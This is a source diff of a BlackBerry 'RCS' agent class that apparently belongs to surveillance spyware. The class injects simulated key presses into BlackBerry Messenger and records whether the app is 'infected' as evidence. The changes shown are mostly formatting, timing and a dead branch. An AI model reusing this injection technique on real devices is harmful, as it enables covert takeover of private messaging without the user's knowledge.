@@ -6,7 +6,6 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
 
 package blackberry.agent.im;
 
@@ -22,10 +21,10 @@ import blackberry.interfaces.Singleton;
 import blackberry.utils.Utils;
 
 /**
- * Free letters: qwrtyudfgjklzbnm
- * bbm
+ * Free letters: qwrtyudfgjklzbnm bbm
+ * 
  * @author zeno
- *
+ * 
  */
 public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     //#ifdef DEBUG
@@ -37,8 +36,8 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     private static final int DELAY = 5000;
 
     private static final int MAX_TRIES = 8;
-    
-    private int delay = 200;
+
+    private int delay = 100;
     private int tries = 0;
 
     public static synchronized AppInjectorBBM getInstance() {
@@ -84,22 +83,32 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         //#endif
 
         tries++;
-        if(tries >= MAX_TRIES){
+        if (tries >= MAX_TRIES) {
             //#ifdef DEBUG
             debug.error("callMenuByKey: too many tries");
             //#endif
-            if(tries == MAX_TRIES){
+            if (tries == MAX_TRIES) {
                 Evidence.info("NO BBM");
             }
             return false;
         }
 
         //#ifdef DEBUG
-        debug.trace("callMenuByKey press raw key: " + tries);
+        debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
-        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        if (true) {
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey: pressRawKey");
+            //#endif
+            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        } else {
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey: pressKey");
+            //#endif
+            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
+        }
         Utils.sleep(delay + tries * 20);
         KeyInjector.trackBallRawClick();
 
@@ -126,7 +135,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     }
 
     public void setInfected(boolean value) {
-        if(value){
+        if (value) {
             Evidence.info("BBM");
         }
         infected = value;
